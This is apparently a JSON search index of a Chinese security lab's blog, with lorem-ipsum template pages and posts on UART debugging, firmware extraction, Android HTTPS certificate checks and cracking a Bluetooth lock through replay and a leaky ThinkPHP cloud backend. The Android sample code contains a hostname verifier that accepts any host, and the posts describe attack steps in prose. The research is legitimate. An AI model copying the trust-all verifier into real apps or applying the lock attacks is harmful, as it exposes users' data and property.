{"pages":[{"title":"","date":"2017-07-10T17:24:49.624Z","path":"index.html","text":"We are here to help you. Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Multipurpose Template Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Well Documented Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Responsive Design Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. We're committed to our process. Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste. Goal definition Lorem ipsum dolor sit amet sit consectetur adipisicing eiusmod tempor. Analyse Lorem ipsum dolor sit amet sit consectetur adipisicing eiusmod tempor. Implementation Lorem ipsum dolor sit amet sit consectetur adipisicing eiusmod tempor. Recent Work Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde voluptatem. Sed unde omnis iste natus error sit voluptatem. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Multipurpose Documented Responsive Clean & Fresh Raw denim you probably haven't heard of them jean shorts Austin. Nesciunt tofu stumptown aliqua, retro synth master cleanse. Mustache cliche tempor, williamsburg carles vegan helvetica. Cosby sweater eu banh mi, qui irure terry richardson ex squid Aliquip placeat salvia cillum iphone. Read more Food truck fixie locavore, accusamus mcsweeney's marfa nulla single-origin coffee squid. Exercitation +1 labore velit, blog sartorial PBR leggings next level wes anderson artisan four loko farm-to-table craft beer twee. Qui photo booth letterpress, commodo enim craft beer mlkshk aliquip jean shorts ullamco ad vinyl cillum PBR. Homo nostrud organic, assumenda labore aesthetic magna delectus mollit. Keytar helvetica VHS salvia.. Etsy mixtape wayfarers, ethical wes anderson tofu before they sold out mcsweeney's organic lomo retro fanny pack lo-fi farm-to-table readymade. Messenger bag gentrify pitchfork tattooed craft beer, iphone skateboard locavore carles etsy salvia banksy hoodie helvetica. DIY synth PBR banksy irony. Leggings gentrify squid 8-bit cred pitchfork. Williamsburg banh mi whatever gluten-free, carles pitchfork biodiesel fixie etsy retro mlkshk vice blog. Scenester cred you probably haven't heard of them, vinyl craft beer blog stumptown. Pitchfork sustainable tofu synth chambray yr. Trust fund seitan letterpress, keytar raw denim keffiyeh etsy art party before they sold out master cleanse gluten-free squid scenester freegan cosby sweater. Fanny pack portland seitan DIY, art party locavore wolf cliche high life echo park Austin. Cred vinyl keffiyeh DIY salvia PBR, banh mi before they sold out farm-to-table VHS viral locavore cosby sweater. Lomo wolf viral, mustache readymade thundercats keffiyeh craft beer marfa ethical. Wolf salvia freegan, sartorial keffiyeh echo park vegan. Denim you probably haven't heard of. Lorem ipsum dolor met consectetur adipisicing sit amet, consectetur adipisicing elit, of them jean shorts sed magna aliqua. Lorem ipsum dolor met. Lina Mars Commercial Director Raw denim you Mustache cliche tempor, williamsburg carles vegan helvetica probably haven't heard of them jean shorts austin. Nesciunt tofu stumptown aliqua, retro synth master cleanse. Mustache cliche tempor, williamsburg carles vegan helvetica. Kate Ford Commercial Director Reprehenderit butcher stache cliche tempor, williamsburg carles vegan helvetica.retro keffiyeh dreamcatcher synth. Cosby sweater eu banh mi, qui irure terry richardson ex squid Aliquip placeat salvia cillum iphone. Jake Witson Commercial Director Metronic - The Most Complete &amp; Popular Admin &amp; Frontend Theme Preview Admin Our Clients Lorem dipsum folor margade sitede lametep eiusmod psumquis dolore."},{"title":"About Us","date":"2015-11-16T17:00:51.000Z","path":"about/index.html","text":"Vero eos et accusamus At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi. Idest laborum et dolorum fuga. Et harum quidem rerum et quas molestias excepturi sint occaecati facilis est et expedita distinctio lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut non libero consectetur adipiscing elit magna. Sed et quam lacus. Officia deserunt molliti Consectetur adipiscing Deserunt fpicia Officia deserunt molliti Consectetur adipiscing Deserunt fpicia Excepturi sint occaecati cupiditate non provident Ducimus qui blanditiis praesentium voluptatum Ut non libero consectetur adipiscing elit magna Client Testimonials Denim you probably haven't heard of. Lorem ipsum dolor met consectetur adipisicing sit amet, consectetur adipisicing elit, of them jean shorts sed magna aliqua. Lorem ipsum dolor met consectetur adipisicing sit amet do eiusmod dolore. Lina Mars Commercial Director Raw denim you Mustache cliche tempor, williamsburg carles vegan helvetica probably haven't heard of them jean shorts austin. Nesciunt tofu stumptown aliqua, retro synth master cleanse. Mustache cliche tempor, williamsburg carles vegan helvetica. Kate Ford Commercial Director Reprehenderit butcher stache cliche tempor, williamsburg carles vegan helvetica.retro keffiyeh dreamcatcher synth. Cosby sweater eu banh mi, qui irure terry richardson ex squid Aliquip placeat salvia cillum iphone. Jake Witson Commercial Director Our Skills UI Design 90% Wordpress CMS 60% HTML/CSS &amp; JavaScript 75% Lina Doe Chief Executive Officer / CEO Donec id elit non mi porta gravida at eget metus. Fusce dapibus, justo sit amet risus etiam porta sem... Carles Puyol Chief Executive Officer / CEO Donec id elit non mi porta gravida at eget metus. Fusce dapibus, justo sit amet risus etiam porta sem... Andres Iniesta Chief Executive Officer / CEO Donec id elit non mi porta gravida at eget metus. Fusce dapibus, justo sit amet risus etiam porta sem... Jessica Alba Chief Executive Officer / CEO Donec id elit non mi porta gravida at eget metus. Fusce dapibus, justo sit amet risus etiam porta sem..."},{"title":"About US","date":"2017-07-10T17:24:49.624Z","path":"about/index.html","text":"Future-Sec founded in 2015, made up of a bunch of fresh blood after the dream; engage in realistic security technology research, and publish research results to the public on a regular basis and practical security tool, main areas of research: intelligent home, financial security, mobile security, Internet browser security, automated security scanning technology, data analysis, next-generation security and so on. Team is also committed to submit to every Internet company services and software vulnerabilities, and gain thank the large vendors such as Microsoft, Tencent, Oracle. Our vision: every information security guards in their personal life on Earth. 我们部分披露过的重大漏洞 Foxmail邮件客户端远程命令执行漏洞 酷狗PC客户端远程JS代码注入漏洞(影响全国酷狗用户可挂马) 115浏览器设计缺陷可导致远程窃取用户系统上的任意文件 一个可大规模隐蔽窃取百度账号密码的漏洞(无需点击全线产品) Opera and Opera Mail远程命令执行漏洞 国内银行getshell专辑 2015年1月份——伏宸安全实验室成立2015年3月份——完成网络空间搜索引擎2015年12月份——完成伏宸自动化渗透平台2016年2月份——上线HASH破解应用"},{"title":"Contact","date":"2015-11-29T13:00:03.000Z","path":"contact/index.html","text":"Let us help Lorem ipsum sdolor sic amit, bolero carles. Name Email Message Send Cancel"},{"title":"Projects","date":"2015-11-29T13:00:03.000Z","path":"projects/index.html","text":"All UI Design Web Development Photography Wordpress and Logo Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back"},{"title":"Categories","date":"2017-07-10T17:24:49.624Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2017-07-10T17:24:49.624Z","path":"tags/index.html","text":""},{"title":"Login","date":"2017-07-10T17:24:49.624Z","path":"login/index.html","text":"Email * Password * Forget Password? Login or login using: Important Information Duis autem vel eum iriure at dolor vulputate velit esse vel molestie at dolore. More details"}],"posts":[{"title":"物联网硬件安全分析基础-串口调试","date":"2017-12-04T16:00:00.000Z","path":"iot-security-hardware-debuging.html","text":"前言上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。 UART串口调试UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。 案例一：调试某智能摄像头通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。 案例二：调试某路由器在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。 案例三：调试某路由器在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。设置波特率为57600，串口输出正确，并可执行命令。 案例四：调试某路由器在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。设置波特率为57600，串口输出正确，并可执行命令。通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。 案例五：调试某无线数据终端拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。 案例六：调试某无线数据终端拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"UART串口调试","slug":"UART串口调试","permalink":"http://www.future-sec.com/tags/UART串口调试/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"你在互联网上的数据还在裸奔吗？","date":"2017-12-04T16:00:00.000Z","path":"android-ssl-security.html","text":"这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问题也得到了有效解决。我们本篇文章的讨论内容还是从数据传输过程中所引发的一系列安全问题。 数据裸奔时代使用http协议的数据传输方式HyperText Transfer Protocol，超文本传输协议，是互联网上使用最广泛的一种协议，所有WWW文件必须遵循的标准。HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全。使用TCP端口为：80最初的移动app开发过程中，使用的大部分http协议来进行客户端跟服务端的通信。这个过程中传输的信息都是明文，继而引发了一系列的信息泄露等漏洞.wireshark简单捕获就能看到明文隐私数据当然上述极为不安全的数据传输，在2015年被大量爆出来之后，立即引起了app的开发人员以及使用着的重视。后续的数据传输使用了相对安全的基于SSL/TLS加密的安全的超文本传输协议https。 你所使用的加密数据传输真的有保证你的数据不被窃取吗？https加密传输Hyper Text Transfer Protocol over Secure Socket Layer，安全的超文本传输协议，网景公式设计了SSL(Secure Sockets Layer)协议用于对Http协议传输的数据进行加密，保证会话过程中的安全性。使用TCP端口默认为443SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密。对称加密 速度高，可加密内容较大，用来加密会话过程中的消息公钥加密 加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥 HTTPs单向认证机制单向认证主要是客户端保存有服务端的公钥证书，自己本身是没有私钥证书的。1、给服务器生成密钥方式：keytool -genkeypair -alias skxy -keyalg RSA -validity 3650 -keypass 123456 -storepass 123456 -keystore skxy.keystore2、给Tomcat服务器配置Httpstomcat/config/server.xml修改connector配置12345&lt;Connector port=\"8443\" protocol=\"org.apache.coyote.http11.Http11Protocol\" maxThreads=\"150\" SSLEnabled=\"true\" scheme=\"https\" secure=\"true\" clientAuth=\"false\" sslProtocol=\"TLS\" keystoreFile=\"conf/skxy.keystore\" keystorePass=\"123456\"/&gt; 3、导出证书keytool -export -alias skxy -file skxy.cer -keystore skxy.keystore -storepass 1234564、将证书放在android客户端，能够读取的地方比如assert目录 5.代码中执行网络请求，获取证书，读取https网站的数据。客户端单向认证代码实现部分1234567891011121314151617181920212223242526272829303132333435String path = \"https://10.0.3.2:8443/Test/Hlloer\";? try &#123; //获取证书 InputStream stream = getAssets().open(\"skxy.cer\"); SSLContext tls = SSLContext.getInstance(\"TLS\"); //使用默认证书 KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType()); //去掉系统默认证书 keystore.load(null); Certificate certificate = CertificateFactory.getInstance(\"X.509\").generateCertificate(stream); //设置自己的证书 keystore.setCertificateEntry(\"skxy\", certificate); //通过信任管理器获取一个默认的算法 String algorithm = TrustManagerFactory.getDefaultAlgorithm(); //算法工厂创建 TrustManagerFactory instance = TrustManagerFactory.getInstance(algorithm); instance.init(keystore); tls.init(null, instance.getTrustManagers(), null); SSLSocketFactory socketFactory = tls.getSocketFactory(); HttpsURLConnection.setDefaultSSLSocketFactory(socketFactory); URL url = new URL(path); HttpsURLConnection conn = (HttpsURLConnection) url.openConnection(); //设置ip授权认证：如果已经安装该证书，可以不设置，否则需要设置 conn.setHostnameVerifier(new HostnameVerifier() &#123; @Override public boolean verify(String hostname, SSLSession session) &#123; return true; &#125; &#125;); InputStream inputStream = conn.getInputStream(); String result = getString(inputStream); stream.close(); 单向认证过程：(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书(3) 客户端使用服务端返回的信息验证服务器的合法性，包括： 1.证书是否过期 2.发型服务器证书的CA是否可靠 3.返回的公钥是否能正确解开返回证书中的数字签名 4.服务器证书上的域名是否和服务器的实际域名相匹配 5.验证通过后，将继续进行通信，否则，终止通信(4) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择(5) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。(6) 服务器将选择好的加密方案通过明文方式返回给客户端(7) 客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器(8) 服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。 Https双向认证机制首先对于双向证书验证，也就是说，客户端有自己的密钥，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。客户端双向认证代码实现部分123456789101112131415161718192021222324252627282930313233343536373839public class MySSLSocketFactory &#123;? private static final String KEY_STORE_TYPE_BKS = \"bks\";//证书类型 private static final String KEY_STORE_TYPE_P12 = \"PKCS12\";//证书类型?? private static final String KEY_STORE_PASSWORD = \"****\";//证书密码（应该是客户端证书密码） private static final String KEY_STORE_TRUST_PASSWORD = \"***\";//授信证书密码（应该是服务端证书密码）? public static SSLSocketFactory getSocketFactory(Context context) &#123;?? InputStream trust_input = context.getResources().openRawResource(R.raw.trust);//服务器授信证书 InputStream client_input = context.getResources().openRawResource(R.raw.client);//客户端证书 try &#123; SSLContext sslContext = SSLContext.getInstance(\"TLS\"); KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType()); trustStore.load(trust_input, KEY_STORE_TRUST_PASSWORD.toCharArray()); KeyStore keyStore = KeyStore.getInstance(KEY_STORE_TYPE_P12); keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray()); TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(trustStore); KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray()); sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), new SecureRandom()); SSLSocketFactory factory = sslContext.getSocketFactory(); return factory; &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; finally &#123; try &#123; trust_input.close(); client_input.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 双向认证过程：(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书 客户端使用服务端返回的信息验证服务器的合法性，包括： 1.证书是否过期 2.发型服务器证书的CA是否可靠 3.返回的公钥是否能正确解开返回证书中的数字签名 4.服务器证书上的域名是否和服务器的实际域名相匹配(3) 验证通过后，将继续进行通信，否则，终止通信(4) 服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端(5) 验证客户端的证书，通过验证后，会获得客户端的公钥(6) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择(7) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式(8) 将加密方案通过使用之前获取到的公钥进行加密，返回给客户端(9) 客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端(10) 服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。 我们身边的app中所使用的加密传输是怎样的呢？某宝（金融类app）的数据加密分析（https单向认证） 为了更加清晰的了解https在实际项目中的应用，特意花了点时间分析了一个app的加密认证过程。app虽然加了部分混淆，但并没有加固，所以也不难分析。（1）整个发送https post请求过程.ip以及域名都是固定的，证书也写死在app里。（2）https认证过程判断代理服务器以及证书校验证书校验过程在获取证书的过程中，仅仅读取了证书的信息，并没有实现校验证书是否安全可靠的代码。这里就留下了安全隐患。使用第三方证书一样可以截获数据。数据解密过程在数据解密过程也不够严谨，密钥和向量通过简单逆向分析就能获得。解密key的获取方式：数据包名的md5解密向量通过这个简单分析，你还敢说你的数据是安全传输的吗？ 安全隐患因为开发方便而信任所有证书重写了校验机制，但并没有做任何检验SSL证书有效性。 扩展 Java Security安全体系知识延伸Java Security 背景知识Java Security其实是Java平台中一个比较独立的模块。除了软件实现上内容外，它实际上对应了一系列的规范。从Java2开始，Java Security包含主要三个重要的规范： JavaCryptography Extension（简写为JCE），JCE所包含的内容有加解密，密钥交换，消息摘要（Message Digest，比如MD5等），密钥管理等。本文所涉及的大部分内容都属于JCE的范畴。JavaSecure Socket Extension（简写为JSSE），JSSE所包含的内容就是Java层的SSL/TLS。简单点说，使用JSSE就可以创建SSL/TLS socket了。JavaAuthentication and Authorization Service（简写为JAAS），JSSA和认证/授权有关。这部分内容在客户端接触得会比较少一点，所以本文不拟讨论它。在上述三个子模块或规范中，JCE是JavaSecurity的大头，其他两个子模块JSSE和JAAS都依赖于它，比如SSL/TLS在工作过程中需要使用密钥对数据进行加解密，那么密钥的创建和使用就依靠JCE子模块了。 另外，既然和安全相关，那么对安全敏感的相关部门或政府肯定会有所干涉。Java是在美国被发明的，所以美国政府对于Java Security方面的出口（比如哪些模块，哪些功能能给其他国家使用）有相关的限制。例如，不允许出口的JCE（从软件实现上看，可能就是从Java官网上下载到的几个Jar包文件）支持一些高级的加解密功能（比如在密钥长度等方面有所限制）。 JCE的介绍JCE最初是作为JCA的扩展包开发的，旨在提供受美国出口控制条例管制的加密服务API和实现。JCE提供一个提供者实现和一组相关的API和包，以支持加密和解密，密钥的生成和协商以及消息验证算法，其中对加密和解密的支持包括对称加密、非对称加密、块加密和流加密。JCE还支持安全流和封装流对象。JCE的架构模型如下图所示： issue1.不要忽略证书校验 2.保护好自己的密钥 3.尽量使用规范的https协议 参考1.http://blog.csdn.net/xdd19910505/article/details/51926540 2.https://www.cnblogs.com/xiekeli/p/5607107.html 3.http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html 4.https://www.waitalone.cn/bank-ssl-cap.html","tags":[{"name":"ssl","slug":"ssl","permalink":"http://www.future-sec.com/tags/ssl/"},{"name":"android安全","slug":"android安全","permalink":"http://www.future-sec.com/tags/android安全/"}],"categories":[{"name":"android安全","slug":"android安全","permalink":"http://www.future-sec.com/categories/android安全/"}]},{"title":"如何破解一个蓝牙锁","date":"2017-11-26T16:00:00.000Z","path":"how-to-crack-a-ble-lock.html","text":"前言随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。 蓝牙锁介绍 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。 如何去破解一个蓝牙锁 目标介绍这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。 内部构架显微镜查看电路板 拆解 蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。 探测使用app初步连接探测，可以看到 开锁流程Logcat 查看app日志 流程为 攻击方式一般对于蓝牙锁的攻击方式有三种 1、重放攻击2、暴力破解(6位数字)3、云端漏洞 重放攻击 通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。 云端漏洞云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息 没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。 漏洞利用对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。工作流程为 利用 com.inuker.bluetooth 库快速开发 APP界面 视频演示 https://v.qq.com/x/page/b051058vicv.html 参考ti官方页面 http://www.ti.com.cn/product/cn/CC2541cc2541蓝牙芯片手册 https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html","tags":[{"name":"智能锁","slug":"智能锁","permalink":"http://www.future-sec.com/tags/智能锁/"},{"name":"蓝牙攻击","slug":"蓝牙攻击","permalink":"http://www.future-sec.com/tags/蓝牙攻击/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"物联网硬件安全分析基础-固件提取","date":"2017-11-26T16:00:00.000Z","path":"iot-security-hardware-obtain.html","text":"前言上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。 编程器读取通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。 案例一：读取中控F7门禁固件拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。 连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。 点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。 案例二：读取某智能摄像头固件拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。 在显微镜下，可以看到是一颗25L64型号的Flash芯片。 用夹具连接各引脚，并和编程器连接，进行固件读取。 识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。 